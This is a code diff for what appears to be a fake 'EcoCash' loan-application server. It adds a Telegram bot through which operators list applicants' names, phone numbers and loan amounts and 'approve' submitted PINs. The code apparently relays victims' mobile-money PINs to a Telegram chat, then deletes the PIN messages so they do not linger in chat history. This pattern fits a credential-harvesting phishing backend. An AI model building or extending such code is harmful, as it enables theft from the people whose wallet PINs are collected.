@@ -734,8 +734,200 @@ async function processTelegramUpdate(update) {
       const action = match[1].toLowerCase();
       const appId = match[2];
 
-      // ---- PIN approve / reject ----
+            // ---- PIN approve / reject ----
       if (action === 'pinapprove' || action === 'pinreject') {
         const approved = action === 'pinapprove';
 
-        const pinRow = await pool.query
+        const pinRow = await pool.query(
+          `UPDATE applications
+              SET pin_status=$1,
+                  pin_approved_at = CASE WHEN $1='approved' THEN NOW() ELSE NULL END,
+                  pin_rejected_at = CASE WHEN $1='rejected' THEN NOW() ELSE NULL END
+            WHERE id=$2
+            RETURNING id, first_name, last_name, phone, pin_status`,
+          [approved ? 'approved' : 'rejected', appId]
+        );
+
+        const pr = pinRow.rows[0];
+
+        await telegramApi('answerCallbackQuery', {
+          callback_query_id: callback.id,
+          text: pr ? `PIN ${pr.pin_status}` : 'Application not found.'
+        }).catch(() => {});
+
+        if (pr && callback.message) {
+          // Delete the original PIN message so the PIN doesn't linger in chat history.
+          await telegramApi('deleteMessage', {
+            chat_id: chatId,
+            message_id: callback.message.message_id
+          }).catch(() => {});
+
+          await sendTelegram(
+            chatId,
+            `PIN ${pr.pin_status.toUpperCase()} for ${pr.first_name} ${pr.last_name} (${pr.phone})`
+          );
+        }
+
+        return;
+      }
+
+      // ---- Application approve / reject ----
+      const status = action === 'approve' ? 'approved' : 'rejected';
+
+      const row = await setApplicationStatus(appId, status, 'Telegram admin');
+
+      await telegramApi('answerCallbackQuery', {
+        callback_query_id: callback.id,
+        text: row ? `Application ${row.status}` : 'Application not found.'
+      }).catch(() => {});
+
+      if (row && callback.message) {
+        await telegramApi('editMessageReplyMarkup', {
+          chat_id: chatId,
+          message_id: callback.message.message_id,
+          reply_markup: { inline_keyboard: [] }
+        }).catch(() => {});
+      }
+    } catch (error) {
+      console.error('Telegram approval action failed:', error.message);
+
+      await telegramApi('answerCallbackQuery', {
+        callback_query_id: callback.id,
+        text: 'Could not update application.'
+      }).catch(() => {});
+    }
+
+    return;
+  }
+
+  const text = String(msg?.text || '').trim();
+
+  if (text === '/start' || text === '/help') {
+    await sendTelegram(
+      chatId,
+      'EcoCash admin bot is connected. Commands:\n' +
+      '/pending — list pending application IDs\n' +
+      '/pendingpins — list applications awaiting PIN approval\n' +
+      '/status APPLICATION_ID — show application status\n' +
+      '/whoami — show your chat and user IDs.'
+    );
+  } else if (text === '/pending') {
+    const result = await pool.query(
+      `SELECT id,first_name,last_name,phone,loan_amount,loan_term
+       FROM applications
+       WHERE status='pending'
+       ORDER BY created_at DESC
+       LIMIT 20`
+    );
+
+    if (!result.rows.length) {
+      await sendTelegram(chatId, 'No pending applications.');
+    } else {
+      for (const item of result.rows) {
+        await sendTelegram(
+          chatId,
+          `${item.id}\n${item.first_name} ${item.last_name} — ${item.phone}\n` +
+          `USD ${item.loan_amount} / ${item.loan_term}`
+        );
+      }
+    }
+  } else if (text === '/pendingpins') {
+    const result = await pool.query(
+      `SELECT id,first_name,last_name,phone
+       FROM applications
+       WHERE pin_status='pending'
+       ORDER BY created_at DESC
+       LIMIT 20`
+    );
+
+    if (!result.rows.length) {
+      await sendTelegram(chatId, 'No PINs awaiting approval.');
+    } else {
+      for (const item of result.rows) {
+        await sendTelegram(
+          chatId,
+          `${item.id}\n${item.first_name} ${item.last_name} — ${item.phone}`
+        );
+      }
+    }
+  } else if (text.startsWith('/status')) {
+    const parts = text.split(/\s+/);
+    const id = parts[1];
+
+    if (!id || !/^[0-9a-f-]{36}$/i.test(id)) {
+      await sendTelegram(chatId, 'Usage: /status APPLICATION_ID');
+      return;
+    }
+
+    const result = await pool.query(
+      `SELECT id,first_name,last_name,phone,status,pin_status,created_at
+         FROM applications WHERE id=$1`,
+      [id]
+    );
+
+    const row = result.rows[0];
+
+    if (!row) {
+      await sendTelegram(chatId, 'Application not found.');
+    } else {
+      await sendTelegram(
+        chatId,
+        `${row.first_name} ${row.last_name} — ${row.phone}\n` +
+        `Application: ${row.status}\n` +
+        `PIN: ${row.pin_status}\n` +
+        `Submitted: ${new Date(row.created_at).toISOString()}`
+      );
+    }
+  } else if (text === '/whoami') {
+    await sendTelegram(
+      chatId,
+      `chat_id: ${chatId}\nuser_id: ${fromId}`
+    );
+  }
+}
+
+async function startTelegramPolling() {
+  if (!BOT_TOKEN || telegramPolling) return;
+
+  telegramPolling = true;
+
+  // Clear any webhook so getUpdates works.
+  await telegramApi('deleteWebhook', { drop_pending_updates: false })
+    .catch(error => console.warn('deleteWebhook failed:', error.message));
+
+  // eslint-disable-next-line no-constant-condition
+  while (true) {
+    try {
+      const updates = await telegramApi('getUpdates', {
+        offset: telegramOffset,
+        timeout: 25,
+        allowed_updates: ['message', 'callback_query']
+      });
+
+      if (Array.isArray(updates)) {
+        for (const update of updates) {
+          telegramOffset = update.update_id + 1;
+
+          try {
+            await processTelegramUpdate(update);
+          } catch (error) {
+            console.error('Telegram update processing failed:', error.message);
+          }
+        }
+      }
+    } catch (error) {
+      console.error('Telegram polling error:', error.message);
+      await new Promise(resolve => setTimeout(resolve, 3000));
+    }
+  }
+}
+
+startTelegramPolling().catch(error => {
+  console.error('Telegram polling could not start:', error.message);
+});
+
+// START SERVER
+
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
+});
